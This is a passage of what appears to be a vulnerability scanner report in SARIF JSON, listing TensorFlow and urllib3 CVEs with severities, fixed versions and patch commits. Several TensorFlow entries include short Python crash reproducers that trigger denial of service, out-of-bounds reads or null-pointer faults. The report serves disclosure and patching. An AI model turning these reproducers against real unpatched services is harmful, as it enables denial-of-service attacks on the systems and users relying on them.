                "text": "Vulnerability CVE-2023-25671\nSeverity: high\nFixed Version: 2.11.1\nLink: [CVE-2023-25671](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-25671)\n### Impact\nOut-of-bounds access due to mismatched integer type sizes in ValueMap::Manager::GetValueOrCreatePlaceholder. Bug with tfg-translate call to InitMlir. The problem happens with generic functions, as it is already handled for non-generic functions. This is because they, unlike non-generic functions, are using the \"old importer\". A better long-term solution may be to have the \"new importer\" handle generic functions.\n\n### Patches\nWe have patched the issue in GitHub\n- commit [760322a71ac9033e122ef1f4b1c62813021e5938](https://github.com/tensorflow/tensorflow/commit/760322a71ac9033e122ef1f4b1c62813021e5938).\n- commit [2eedc8f676d2c3b8be9492e547b2bc814c10b367](https://github.com/tensorflow/tensorflow/commit/2eedc8f676d2c3b8be9492e547b2bc814c10b367)\n\nThe fix will be included in TensorFlow 2.12.0. We will also cherrypick this commit on TensorFlow 2.11.1\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by r3pwnx\n\n### Affiliation\n360 AIVul\n\n",
                "markdown": "**Vulnerability CVE-2023-25671**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.11.1|[CVE-2023-25671](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-25671)|\n\n### Impact\nOut-of-bounds access due to mismatched integer type sizes in ValueMap::Manager::GetValueOrCreatePlaceholder. Bug with tfg-translate call to InitMlir. The problem happens with generic functions, as it is already handled for non-generic functions. This is because they, unlike non-generic functions, are using the \"old importer\". A better long-term solution may be to have the \"new importer\" handle generic functions.\n\n### Patches\nWe have patched the issue in GitHub\n- commit [760322a71ac9033e122ef1f4b1c62813021e5938](https://github.com/tensorflow/tensorflow/commit/760322a71ac9033e122ef1f4b1c62813021e5938).\n- commit [2eedc8f676d2c3b8be9492e547b2bc814c10b367](https://github.com/tensorflow/tensorflow/commit/2eedc8f676d2c3b8be9492e547b2bc814c10b367)\n\nThe fix will be included in TensorFlow 2.12.0. We will also cherrypick this commit on TensorFlow 2.11.1\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by r3pwnx\n\n### Affiliation\n360 AIVul\n\n"
              },
              "properties": {
                "security-severity": "7.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2023-25661",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2023-25661"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-25661",
              "help": {
                "text": "Vulnerability CVE-2023-25661\nSeverity: medium\nFixed Version: 2.11.1\nLink: [CVE-2023-25661](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-25661)\n### Impact\nA malicious invalid input crashes a tensorflow model (Check Failed) and can be used to trigger a denial of service attack.\nTo minimize the bug, we built a simple single-layer TensorFlow model containing a Convolution3DTranspose layer, which works well with expected inputs and can be deployed in real-world systems. However, if we call the model with a malicious input which has a zero dimension, it gives Check Failed failure and crashes. \n```python\nimport tensorflow as tf\n\nclass MyModel(tf.keras.Model):\n    def __init__(self):\n        super().__init__()\n        self.conv = tf.keras.layers.Convolution3DTranspose(2, [3,3,3], padding=\"same\")\n        \n    def call(self, input):\n        return self.conv(input)\nmodel = MyModel() # Defines a valid model.\n\nx = tf.random.uniform([1, 32, 32, 32, 3], minval=0, maxval=0, dtype=tf.float32) # This is a valid input.\noutput = model.predict(x)\nprint(output.shape) # (1, 32, 32, 32, 2)\n\nx = tf.random.uniform([1, 32, 32, 0, 3], dtype=tf.float32) # This is an invalid input.\noutput = model(x) # crash\n```\nThis Convolution3DTranspose layer is a very common API in modern neural networks. The ML models containing such vulnerable components could be deployed in ML applications or as cloud services. This failure could be potentially used to trigger a denial of service attack on ML cloud services.\n\n### Patches\nWe have patched the issue in\n- GitHub commit [948fe6369a5711d4b4568ea9bbf6015c6dfb77e2](https://github.com/tensorflow/tensorflow/commit/948fe6369a5711d4b4568ea9bbf6015c6dfb77e2)\n- GitHub commit [85db5d07db54b853484bfd358c3894d948c36baf](https://github.com/keras-team/keras/commit/85db5d07db54b853484bfd358c3894d948c36baf).\n\nThe fix will be included in TensorFlow 2.12.0. We will also cherrypick this commit on TensorFlow 2.11.1\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n",
                "markdown": "**Vulnerability CVE-2023-25661**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.11.1|[CVE-2023-25661](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-25661)|\n\n### Impact\nA malicious invalid input crashes a tensorflow model (Check Failed) and can be used to trigger a denial of service attack.\nTo minimize the bug, we built a simple single-layer TensorFlow model containing a Convolution3DTranspose layer, which works well with expected inputs and can be deployed in real-world systems. However, if we call the model with a malicious input which has a zero dimension, it gives Check Failed failure and crashes. \n```python\nimport tensorflow as tf\n\nclass MyModel(tf.keras.Model):\n    def __init__(self):\n        super().__init__()\n        self.conv = tf.keras.layers.Convolution3DTranspose(2, [3,3,3], padding=\"same\")\n        \n    def call(self, input):\n        return self.conv(input)\nmodel = MyModel() # Defines a valid model.\n\nx = tf.random.uniform([1, 32, 32, 32, 3], minval=0, maxval=0, dtype=tf.float32) # This is a valid input.\noutput = model.predict(x)\nprint(output.shape) # (1, 32, 32, 32, 2)\n\nx = tf.random.uniform([1, 32, 32, 0, 3], dtype=tf.float32) # This is an invalid input.\noutput = model(x) # crash\n```\nThis Convolution3DTranspose layer is a very common API in modern neural networks. The ML models containing such vulnerable components could be deployed in ML applications or as cloud services. This failure could be potentially used to trigger a denial of service attack on ML cloud services.\n\n### Patches\nWe have patched the issue in\n- GitHub commit [948fe6369a5711d4b4568ea9bbf6015c6dfb77e2](https://github.com/tensorflow/tensorflow/commit/948fe6369a5711d4b4568ea9bbf6015c6dfb77e2)\n- GitHub commit [85db5d07db54b853484bfd358c3894d948c36baf](https://github.com/keras-team/keras/commit/85db5d07db54b853484bfd358c3894d948c36baf).\n\nThe fix will be included in TensorFlow 2.12.0. We will also cherrypick this commit on TensorFlow 2.11.1\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n"
              },
              "properties": {
                "security-severity": "6.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2023-27579",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2023-27579"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-27579",
              "help": {
                "text": "Vulnerability CVE-2023-27579\nSeverity: high\nFixed Version: 2.11.1\nLink: [CVE-2023-27579](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-27579)\n### Impact\nConstructing a tflite model with a paramater `filter_input_channel` of less than 1 gives a FPE.\n\n\n### Patches\nWe have patched the issue in GitHub commit [34f8368c535253f5c9cb3a303297743b62442aaa](https://github.com/tensorflow/tensorflow/commit/34f8368c535253f5c9cb3a303297743b62442aaa).\n\nThe fix will be included in TensorFlow 2.12. We will also cherrypick this commit on TensorFlow 2.11.1.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability was reported by Wang Xuan of Qihoo 360 AIVul Team.\n",
                "markdown": "**Vulnerability CVE-2023-27579**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.11.1|[CVE-2023-27579](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-27579)|\n\n### Impact\nConstructing a tflite model with a paramater `filter_input_channel` of less than 1 gives a FPE.\n\n\n### Patches\nWe have patched the issue in GitHub commit [34f8368c535253f5c9cb3a303297743b62442aaa](https://github.com/tensorflow/tensorflow/commit/34f8368c535253f5c9cb3a303297743b62442aaa).\n\nThe fix will be included in TensorFlow 2.12. We will also cherrypick this commit on TensorFlow 2.11.1.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability was reported by Wang Xuan of Qihoo 360 AIVul Team.\n"
              },
              "properties": {
                "security-severity": "7.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2023-25801",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2023-25801"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-25801",
              "help": {
                "text": "Vulnerability CVE-2023-25801\nSeverity: high\nFixed Version: 2.11.1\nLink: [CVE-2023-25801](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-25801)\n### Impact\n`nn_ops.fractional_avg_pool_v2` and `nn_ops.fractional_max_pool_v2` require the first and fourth elements of their parameter `pooling_ratio` to be equal to 1.0, as pooling on batch and channel dimensions is not supported.\n\n```python\nimport tensorflow as tf\nimport os\nimport numpy as np\nfrom tensorflow.python.ops import nn_ops\ntry:\n  arg_0_tensor = tf.random.uniform([3, 30, 50, 3], dtype=tf.float64)\n  arg_0 = tf.identity(arg_0_tensor)\n  arg_1_0 = 2\n  arg_1_1 = 3\n  arg_1_2 = 1\n  arg_1_3 = 1\n  arg_1 = [arg_1_0,arg_1_1,arg_1_2,arg_1_3,]\n  arg_2 = True\n  arg_3 = True\n  seed = 341261001\n  out = nn_ops.fractional_avg_pool_v2(arg_0,arg_1,arg_2,arg_3,seed=seed,)\nexcept Exception as e:\n  print(\"Error:\"+str(e))\n```\n\n### Patches\nWe have patched the issue in GitHub commit [ee50d1e00f81f62a4517453f721c634bbb478307](https://github.com/tensorflow/tensorflow/commit/ee50d1e00f81f62a4517453f721c634bbb478307).\n\nThe fix will be included in TensorFlow 2.12. We will also cherrypick this commit on TensorFlow 2.11.1.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability was reported by [dmc1778](https://github.com/dmc1778), of [nimashiri2012@gmail.com](mailto:nimashiri2012@gmail.com).\n",
                "markdown": "**Vulnerability CVE-2023-25801**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.11.1|[CVE-2023-25801](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-25801)|\n\n### Impact\n`nn_ops.fractional_avg_pool_v2` and `nn_ops.fractional_max_pool_v2` require the first and fourth elements of their parameter `pooling_ratio` to be equal to 1.0, as pooling on batch and channel dimensions is not supported.\n\n```python\nimport tensorflow as tf\nimport os\nimport numpy as np\nfrom tensorflow.python.ops import nn_ops\ntry:\n  arg_0_tensor = tf.random.uniform([3, 30, 50, 3], dtype=tf.float64)\n  arg_0 = tf.identity(arg_0_tensor)\n  arg_1_0 = 2\n  arg_1_1 = 3\n  arg_1_2 = 1\n  arg_1_3 = 1\n  arg_1 = [arg_1_0,arg_1_1,arg_1_2,arg_1_3,]\n  arg_2 = True\n  arg_3 = True\n  seed = 341261001\n  out = nn_ops.fractional_avg_pool_v2(arg_0,arg_1,arg_2,arg_3,seed=seed,)\nexcept Exception as e:\n  print(\"Error:\"+str(e))\n```\n\n### Patches\nWe have patched the issue in GitHub commit [ee50d1e00f81f62a4517453f721c634bbb478307](https://github.com/tensorflow/tensorflow/commit/ee50d1e00f81f62a4517453f721c634bbb478307).\n\nThe fix will be included in TensorFlow 2.12. We will also cherrypick this commit on TensorFlow 2.11.1.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability was reported by [dmc1778](https://github.com/dmc1778), of [nimashiri2012@gmail.com](mailto:nimashiri2012@gmail.com).\n"
              },
              "properties": {
                "security-severity": "8.0",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2023-25674",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2023-25674"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-25674",
              "help": {
                "text": "Vulnerability CVE-2023-25674\nSeverity: high\nFixed Version: 2.11.1\nLink: [CVE-2023-25674](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-25674)\n### Impact\nNPE in RandomShuffle with XLA enable \n```python\nimport tensorflow as tf\n\nfunc = tf.raw_ops.RandomShuffle\npara = {`value`: 1e+20, `seed`: -4294967297, `seed2`: -2147483649}\n\n@tf.function(jit_compile=True)\ndef test():\n   y = func(**para)\n   return y\n\ntest()\n```\n\n### Patches\nWe have patched the issue in GitHub commit [728113a3be690facad6ce436660a0bc1858017fa](https://github.com/tensorflow/tensorflow/commit/728113a3be690facad6ce436660a0bc1858017fa).\n\nThe fix will be included in TensorFlow 2.12.0. We will also cherrypick this commit on TensorFlow 2.11.1\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by r3pwnx\n",
                "markdown": "**Vulnerability CVE-2023-25674**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.11.1|[CVE-2023-25674](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-25674)|\n\n### Impact\nNPE in RandomShuffle with XLA enable \n```python\nimport tensorflow as tf\n\nfunc = tf.raw_ops.RandomShuffle\npara = {`value`: 1e+20, `seed`: -4294967297, `seed2`: -2147483649}\n\n@tf.function(jit_compile=True)\ndef test():\n   y = func(**para)\n   return y\n\ntest()\n```\n\n### Patches\nWe have patched the issue in GitHub commit [728113a3be690facad6ce436660a0bc1858017fa](https://github.com/tensorflow/tensorflow/commit/728113a3be690facad6ce436660a0bc1858017fa).\n\nThe fix will be included in TensorFlow 2.12.0. We will also cherrypick this commit on TensorFlow 2.11.1\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by r3pwnx\n"
              },
              "properties": {
                "security-severity": "7.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2023-25658",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2023-25658"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-25658",
              "help": {
                "text": "Vulnerability CVE-2023-25658\nSeverity: high\nFixed Version: 2.11.1\nLink: [CVE-2023-25658](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-25658)\n### Impact\nOut of bounds read in GRUBlockCellGrad\n```python\nfunc = tf.raw_ops.GRUBlockCellGrad\n\npara = {`x`: [[21.1, 156.2], [83.3, 115.4]], `h_prev`: array([[136.5],\n      [136.6]]), `w_ru`: array([[26.7,  0.8],\n      [47.9, 26.1],\n      [26.2, 26.3]]), `w_c`: array([[ 0.4],\n      [31.5],\n      [ 0.6]]), `b_ru`: array([0.1, 0.2 ], dtype=float32), `b_c`: 0x41414141, `r`: array([[0.3],\n      [0.4]], dtype=float32), `u`: array([[5.7],\n      [5.8]]), `c`: array([[52.9],\n      [53.1]]), `d_h`: array([[172.2],\n      [188.3 ]])}\n```\n\n### Patches\nWe have patched the issue in GitHub commit [ff459137c2716a2a60f7d441b855fcb466d778cb](https://github.com/tensorflow/tensorflow/commit/ff459137c2716a2a60f7d441b855fcb466d778cb).\n\nThe fix will be included in TensorFlow 2.12.0. We will also cherrypick this commit on TensorFlow 2.11.1\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by r3pwnx.\n",
                "markdown": "**Vulnerability CVE-2023-25658**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.11.1|[CVE-2023-25658](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-25658)|\n\n### Impact\nOut of bounds read in GRUBlockCellGrad\n```python\nfunc = tf.raw_ops.GRUBlockCellGrad\n\npara = {`x`: [[21.1, 156.2], [83.3, 115.4]], `h_prev`: array([[136.5],\n      [136.6]]), `w_ru`: array([[26.7,  0.8],\n      [47.9, 26.1],\n      [26.2, 26.3]]), `w_c`: array([[ 0.4],\n      [31.5],\n      [ 0.6]]), `b_ru`: array([0.1, 0.2 ], dtype=float32), `b_c`: 0x41414141, `r`: array([[0.3],\n      [0.4]], dtype=float32), `u`: array([[5.7],\n      [5.8]]), `c`: array([[52.9],\n      [53.1]]), `d_h`: array([[172.2],\n      [188.3 ]])}\n```\n\n### Patches\nWe have patched the issue in GitHub commit [ff459137c2716a2a60f7d441b855fcb466d778cb](https://github.com/tensorflow/tensorflow/commit/ff459137c2716a2a60f7d441b855fcb466d778cb).\n\nThe fix will be included in TensorFlow 2.12.0. We will also cherrypick this commit on TensorFlow 2.11.1\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by r3pwnx.\n"
              },
              "properties": {
                "security-severity": "7.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2023-25670",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2023-25670"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-25670",
              "help": {
                "text": "Vulnerability CVE-2023-25670\nSeverity: high\nFixed Version: 2.11.1\nLink: [CVE-2023-25670](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-25670)\n### Impact\nNPE in QuantizedMatMulWithBiasAndDequantize with MKL enable \n```python\nimport tensorflow as tf\n\nfunc = tf.raw_ops.QuantizedMatMulWithBiasAndDequantize\npara={`a`: tf.constant(138, dtype=tf.quint8), `b`: tf.constant(4, dtype=tf.qint8), `bias`: [[31.81644630432129, 47.21876525878906], [109.95201110839844, 152.07968139648438]], `min_a`: 141.5337138686371, `max_a`: [73.84139251708984, 173.15280151367188], `min_b`: [], `max_b`: [[16.128345489501953, 193.26820373535156]], `min_freezed_output`: [], `max_freezed_output`: [115.50032806396484, 156.974853515625], `Toutput`: 1.0, `transpose_a`: True, `transpose_b`: False, `input_quant_mode`: `MIN_FIRST`}\n\nfunc(**para)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [8a47a39d9697969206d23a523c977238717e8727](https://github.com/tensorflow/tensorflow/commit/8a47a39d9697969206d23a523c977238717e8727).\n\nThe fix will be included in TensorFlow 2.12.0. We will also cherrypick this commit on TensorFlow 2.11.1\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by r3pwnx\n",
                "markdown": "**Vulnerability CVE-2023-25670**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.11.1|[CVE-2023-25670](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-25670)|\n\n### Impact\nNPE in QuantizedMatMulWithBiasAndDequantize with MKL enable \n```python\nimport tensorflow as tf\n\nfunc = tf.raw_ops.QuantizedMatMulWithBiasAndDequantize\npara={`a`: tf.constant(138, dtype=tf.quint8), `b`: tf.constant(4, dtype=tf.qint8), `bias`: [[31.81644630432129, 47.21876525878906], [109.95201110839844, 152.07968139648438]], `min_a`: 141.5337138686371, `max_a`: [73.84139251708984, 173.15280151367188], `min_b`: [], `max_b`: [[16.128345489501953, 193.26820373535156]], `min_freezed_output`: [], `max_freezed_output`: [115.50032806396484, 156.974853515625], `Toutput`: 1.0, `transpose_a`: True, `transpose_b`: False, `input_quant_mode`: `MIN_FIRST`}\n\nfunc(**para)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [8a47a39d9697969206d23a523c977238717e8727](https://github.com/tensorflow/tensorflow/commit/8a47a39d9697969206d23a523c977238717e8727).\n\nThe fix will be included in TensorFlow 2.12.0. We will also cherrypick this commit on TensorFlow 2.11.1\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by r3pwnx\n"
              },
              "properties": {
                "security-severity": "7.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2023-25664",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2023-25664"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-25664",
              "help": {
                "text": "Vulnerability CVE-2023-25664\nSeverity: high\nFixed Version: 2.11.1\nLink: [CVE-2023-25664](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-25664)\n### Impact\n```python\nimport os\nos.environ[`TF_ENABLE_ONEDNN_OPTS`] = `0`\nimport tensorflow as tf\nprint(tf.__version__)\nwith tf.device(\"CPU\"):\n    ksize = [1, 40, 128, 1]\n    strides = [1, 128, 128, 30]\n    padding = \"SAME\"\n    data_format = \"NHWC\"\n    orig_input_shape = [11, 9, 78, 9]\n    grad = tf.saturate_cast(tf.random.uniform([16, 16, 16, 16], minval=-128, maxval=129, dtype=tf.int64), dtype=tf.float32)\n    res = tf.raw_ops.AvgPoolGrad(\n        ksize=ksize,\n        strides=strides,\n        padding=padding,\n        data_format=data_format,\n        orig_input_shape=orig_input_shape,\n        grad=grad,\n    )\n```\n\n### Patches\nWe have patched the issue in GitHub commit [ddaac2bdd099bec5d7923dea45276a7558217e5b](https://github.com/tensorflow/tensorflow/commit/ddaac2bdd099bec5d7923dea45276a7558217e5b).\n\nThe fix will be included in TensorFlow 2.12.0. We will also cherrypick this commit on TensorFlow 2.11.1\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by \u003cevn@google.com\u003e\n",
                "markdown": "**Vulnerability CVE-2023-25664**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.11.1|[CVE-2023-25664](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-25664)|\n\n### Impact\n```python\nimport os\nos.environ[`TF_ENABLE_ONEDNN_OPTS`] = `0`\nimport tensorflow as tf\nprint(tf.__version__)\nwith tf.device(\"CPU\"):\n    ksize = [1, 40, 128, 1]\n    strides = [1, 128, 128, 30]\n    padding = \"SAME\"\n    data_format = \"NHWC\"\n    orig_input_shape = [11, 9, 78, 9]\n    grad = tf.saturate_cast(tf.random.uniform([16, 16, 16, 16], minval=-128, maxval=129, dtype=tf.int64), dtype=tf.float32)\n    res = tf.raw_ops.AvgPoolGrad(\n        ksize=ksize,\n        strides=strides,\n        padding=padding,\n        data_format=data_format,\n        orig_input_shape=orig_input_shape,\n        grad=grad,\n    )\n```\n\n### Patches\nWe have patched the issue in GitHub commit [ddaac2bdd099bec5d7923dea45276a7558217e5b](https://github.com/tensorflow/tensorflow/commit/ddaac2bdd099bec5d7923dea45276a7558217e5b).\n\nThe fix will be included in TensorFlow 2.12.0. We will also cherrypick this commit on TensorFlow 2.11.1\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by \u003cevn@google.com\u003e\n"
              },
              "properties": {
                "security-severity": "7.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2023-33976",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2023-33976"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-33976",
              "help": {
                "text": "Vulnerability CVE-2023-33976\nSeverity: high\nFixed Version: 2.12.1\nLink: [CVE-2023-33976](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-33976)\n### Impact\n`array_ops.upper_bound` causes a segfault when not given a rank 2 tensor.\n\n### Patches\nWe have patched the issue in GitHub commit [915884fdf5df34aaedd00fc6ace33a2cfdefa586](https://github.com/tensorflow/tensorflow/commit/915884fdf5df34aaedd00fc6ace33a2cfdefa586).\n\nThe fix will be included in TensorFlow 2.13. We will also cherrypick this commit in TensorFlow 2.12.1.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by dmc1778",
                "markdown": "**Vulnerability CVE-2023-33976**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.12.1|[CVE-2023-33976](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-33976)|\n\n### Impact\n`array_ops.upper_bound` causes a segfault when not given a rank 2 tensor.\n\n### Patches\nWe have patched the issue in GitHub commit [915884fdf5df34aaedd00fc6ace33a2cfdefa586](https://github.com/tensorflow/tensorflow/commit/915884fdf5df34aaedd00fc6ace33a2cfdefa586).\n\nThe fix will be included in TensorFlow 2.13. We will also cherrypick this commit in TensorFlow 2.12.1.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by dmc1778"
              },
              "properties": {
                "security-severity": "7.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2019-11324",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2019-11324"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-11324",
              "help": {
                "text": "Vulnerability CVE-2019-11324\nSeverity: high\nFixed Version: 1.24.2\nLink: [CVE-2019-11324](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-11324)\nThe urllib3 library before 1.24.2 for Python mishandles certain cases where the desired set of CA certificates is different from the OS store of CA certificates, which results in SSL connections succeeding in situations where a verification failure is the correct outcome. This is related to use of the `ssl_context`, `ca_certs`, or `ca_certs_dir` argument.",
                "markdown": "**Vulnerability CVE-2019-11324**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|1.24.2|[CVE-2019-11324](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-11324)|\n\nThe urllib3 library before 1.24.2 for Python mishandles certain cases where the desired set of CA certificates is different from the OS store of CA certificates, which results in SSL connections succeeding in situations where a verification failure is the correct outcome. This is related to use of the `ssl_context`, `ca_certs`, or `ca_certs_dir` argument."
              },
              "properties": {
                "security-severity": "7.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2019-11236",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2019-11236"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-11236",
              "help": {
                "text": "Vulnerability CVE-2019-11236\nSeverity: medium\nFixed Version: 1.24.3\nLink: [CVE-2019-11236](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-11236)\nIn the urllib3 library through 1.24.2 for Python, CRLF injection is possible if the attacker controls the request parameter.",
                "markdown": "**Vulnerability CVE-2019-11236**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|1.24.3|[CVE-2019-11236](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-11236)|\n\nIn the urllib3 library through 1.24.2 for Python, CRLF injection is possible if the attacker controls the request parameter."
              },
              "properties": {
                "security-severity": "6.1",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2018-25091",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2018-25091"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-25091",
              "help": {
